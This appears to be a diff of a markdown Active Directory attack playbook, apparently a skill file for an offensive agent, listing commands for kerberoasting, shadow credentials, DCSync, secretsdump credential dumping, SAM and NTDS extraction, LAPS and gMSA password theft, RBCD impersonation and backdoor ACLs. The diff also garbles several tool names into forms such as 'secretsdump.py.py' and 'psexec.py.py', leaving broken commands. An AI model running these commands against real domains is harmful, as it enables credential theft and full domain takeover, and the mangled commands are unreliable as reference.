@@ -16,7 +16,7 @@ certipy shadow auto -u '{USER}@{DOMAIN}' -p '{PASS}' -account {TARGET} -dc-ip {I
 
 # 2. Targeted kerberoast (no password change needed)
 bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object {TARGET} servicePrincipalName -v 'fake/spn'
-netexec ldap {IP} -u '{USER}' -p '{PASS}' --kerberoasting kerb.txt
+nxc ldap {IP} -u '{USER}' -p '{PASS}' --kerberoasting kerb.txt
 hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
 bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} remove object {TARGET} servicePrincipalName -v 'fake/spn'
 
@@ -58,7 +58,7 @@ Use certificate for LDAP operations — bypasses LDAP signing/channel binding.
 ```bash
 # Grant DCSync rights using a certificate
 python3 passthecert.py -action modify_rights -crt {USER}.crt -key {USER}.key -domain {DOMAIN} -dc-ip {IP} -target '{DOMAIN}' -rights DCSync
-secretsdump.py {DOMAIN}/{USER}:'{PASS}'@{IP} -just-dc
+secretsdump.py.py {DOMAIN}/{USER}:'{PASS}'@{IP} -just-dc
 
 # Add user to group using certificate
 python3 passthecert.py -action add_user_to_group -crt {USER}.crt -key {USER}.key -domain {DOMAIN} -dc-ip {IP} -user {USER} -group 'Domain Admins'
@@ -86,7 +86,7 @@ bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} add genericAll {TARGET_
 ```bash
 # Grant DCSync
 dacledit.py -action write -rights DCSync -principal '{USER}' -target-dn 'DC=x,DC=x' '{DOMAIN}/{USER}:{PASS}'
-secretsdump.py {DOMAIN}/{USER}:'{PASS}'@{IP} -just-dc
+secretsdump.py.py {DOMAIN}/{USER}:'{PASS}'@{IP} -just-dc
 
 # Grant GenericAll on an object
 dacledit.py -action write -rights FullControl -principal '{USER}' -target-dn '{TARGET_DN}' '{DOMAIN}/{USER}:{PASS}'
@@ -106,13 +106,13 @@ Check the object type to determine which applies:
 bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set password {TARGET} 'NewPass123!'
 
 # If target is a computer → ReadLAPSPassword
-netexec ldap {IP} -u '{USER}' -p '{PASS}' -M laps
+nxc ldap {IP} -u '{USER}' -p '{PASS}' -M laps
 ldapsearch -x -H ldap://{IP} -D '{USER}@{DOMAIN}' -w '{PASS}' -b 'DC=x,DC=x' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd sAMAccountName
 ```
 
 ## ReadGMSAPassword
 ```bash
-netexec ldap {IP} -u '{USER}' -p '{PASS}' --gmsa
+nxc ldap {IP} -u '{USER}' -p '{PASS}' --gmsa
 bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} get object '{GMSA}$' --attr msDS-ManagedPassword
 evil-winrm -i {IP} -u '{GMSA}$' -H {NT_HASH}
 # Then check GMSA$ outbound ACL rights in BloodHound
@@ -120,10 +120,10 @@ evil-winrm -i {IP} -u '{GMSA}$' -H {NT_HASH}
 
 ## ReadLAPSPassword / SyncLAPSPassword
 ```bash
-netexec ldap {IP} -u '{USER}' -p '{PASS}' -M laps
+nxc ldap {IP} -u '{USER}' -p '{PASS}' -M laps
 # Get local admin password for specific computer → PTH or direct login
 evil-winrm -i {TARGET_IP} -u administrator -p '{LAPS_PASS}'
-netexec smb {TARGET_IP} -u administrator -p '{LAPS_PASS}' --sam  # dump SAM
+nxc smb {TARGET_IP} -u administrator -p '{LAPS_PASS}' --sam  # dump SAM
 ```
 
 ## WriteAccountRestrictions → RBCD
@@ -131,9 +131,9 @@ WriteAccountRestrictions allows writing msDS-AllowedToActOnBehalfOfOtherIdentity
 ```bash
 # Add attacker machine to allowed-to-act list on target
 bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object '{TARGET}$' msDS-AllowedToActOnBehalfOfOtherIdentity -v '{ATTACKER_MACHINE_SID}'
-getST.py -spn cifs/{TARGET_FQDN} -impersonate administrator {DOMAIN}/{ATTACKER}$ -hashes :{NT_HASH} -dc-ip {IP}
+getST.py.py -spn cifs/{TARGET_FQDN} -impersonate administrator {DOMAIN}/{ATTACKER}$ -hashes :{NT_HASH} -dc-ip {IP}
 export KRB5CCNAME=administrator@cifs_{TARGET}.ccache
-psexec.py {DOMAIN}/administrator@{TARGET_FQDN} -k -no-pass
+psexec.py.py {DOMAIN}/administrator@{TARGET_FQDN} -k -no-pass
 ```
 
 ## GenericAll / GenericWrite over computer → RBCD or shadow cred
@@ -142,9 +142,9 @@ psexec.py {DOMAIN}/administrator@{TARGET_FQDN} -k -no-pass
 certipy shadow auto -u '{USER}@{DOMAIN}' -p '{PASS}' -account '{COMPUTER}$' -dc-ip {IP}
 
 # RBCD: add fake machine account first
-addcomputer.py {DOMAIN}/{USER}:'{PASS}' -computer-name 'ATTACKER$' -computer-pass 'Attacker123!' -dc-ip {IP}
+addcomputer.py.py {DOMAIN}/{USER}:'{PASS}' -computer-name 'ATTACKER$' -computer-pass 'Attacker123!' -dc-ip {IP}
 bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object '{TARGET}$' msDS-AllowedToActOnBehalfOfOtherIdentity -v '{ATTACKER_SID}'
-getST.py -spn cifs/{TARGET_FQDN} -impersonate administrator {DOMAIN}/ATTACKER$ -dc-ip {IP} -hashes :{NT_HASH}
+getST.py.py -spn cifs/{TARGET_FQDN} -impersonate administrator {DOMAIN}/ATTACKER$ -dc-ip {IP} -hashes :{NT_HASH}
 ```
 
 ## WriteDACL / GenericAll on ADCS template → ESC4
@@ -156,14 +156,14 @@ See adcs skill for full flow.
 reg save HKLM\SAM C:\Temp\sam
 reg save HKLM\SYSTEM C:\Temp\system
 reg save HKLM\SECURITY C:\Temp\security
-secretsdump.py -sam sam -system system -security security LOCAL
+secretsdump.py.py -sam sam -system system -security security LOCAL
 
 # Diskshadow + robocopy method (for NTDS.dit — needs Windows shell)
 # diskshadow.exe → create volume shadow copy → robocopy to accessible path
-secretsdump.py -ntds ntds.dit -system system LOCAL
+secretsdump.py.py -ntds ntds.dit -system system LOCAL
 
-# Remote via netexec (if you have backup ops via WinRM)
-netexec smb {IP} -u '{USER}' -p '{PASS}' --ntds
+# Remote via nxc (if you have backup ops via WinRM)
+nxc smb {IP} -u '{USER}' -p '{PASS}' --ntds
 ```
 
 ## Account Operators
@@ -178,9 +178,9 @@ bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} add groupMember '{TARGE
 
 ## DCSync
 ```bash
-secretsdump.py {DOMAIN}/{USER}:'{PASS}'@{IP} -just-dc
-secretsdump.py {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH} -just-dc
-secretsdump.py {DOMAIN}/{USER}@{IP} -k -no-pass -just-dc   # Kerberos
+secretsdump.py.py {DOMAIN}/{USER}:'{PASS}'@{IP} -just-dc
+secretsdump.py.py {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH} -just-dc
+secretsdump.py.py {DOMAIN}/{USER}@{IP} -k -no-pass -just-dc   # Kerberos
 # After DCSync → see lateral-movement skill: Golden Ticket, PTH, PTT
 ```
 
@@ -206,7 +206,7 @@ dacledit.py -action write -rights FullControl -principal '{BACKDOOR_USER}' -targ
 This combo allows setting unconstrained delegation on a machine you create — enables DC coercion attacks.
 ```bash
 # Create machine account
-addcomputer.py {DOMAIN}/{USER}:'{PASS}' -computer-name 'EVIL$' -computer-pass 'Evil123!' -dc-ip {IP}
+addcomputer.py.py {DOMAIN}/{USER}:'{PASS}' -computer-name 'EVIL$' -computer-pass 'Evil123!' -dc-ip {IP}
 # Set unconstrained delegation on it (requires SeEnableDelegationPrivilege)
 bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object 'EVIL$' userAccountControl -v 528384
 # Then coerce DC auth → see lateral-movement: unconstrained delegation
